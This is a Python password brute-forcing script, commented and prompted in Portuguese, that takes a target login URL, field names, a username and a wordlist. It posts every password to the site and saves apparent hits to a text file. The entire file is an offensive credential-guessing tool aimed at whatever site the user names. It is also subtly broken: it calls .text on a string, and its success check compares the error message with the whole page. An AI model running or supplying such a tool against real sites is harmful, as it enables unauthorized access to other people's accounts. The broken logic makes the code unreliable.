import requests
import os
import pyfiglet
from time import sleep

ascii_banner = pyfiglet.figlet_format("Programmed By A1D3N")
print(ascii_banner)

header = {
'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36'
    }
site = input("Digite o site alvo: ")
campo_login = input("Coloque o campo da requisição do username: ")
login =input("Username do alvo:")
campo_senha = input("Coloque o campo da senha(requisição): ")
error = input("Coloque aqui a mensagem de erro que aparece ao tentar fazer o login: ")
word = open(input("Sua wordlist aqui: "), 'r')

for senhas in word: 
    sleep(5)
    datas = {campo_login:login, 
            campo_senha: senhas}
    resposta = requests.post(site, data=datas, headers=header).text
    if  error != resposta.text:
        print(f"{login} || {senhas} Sucesso")
        su = f'O username é :{login} > e a senha é {senhas}'
        print("Salvando em um arquivo txt......")
        with open('sucesso.txt', 'a') as arquivo:
            arquivo.write(su)                       
   
    else:
        print(f"{login} || {senhas} Incorretos")
        os.system("clear")
  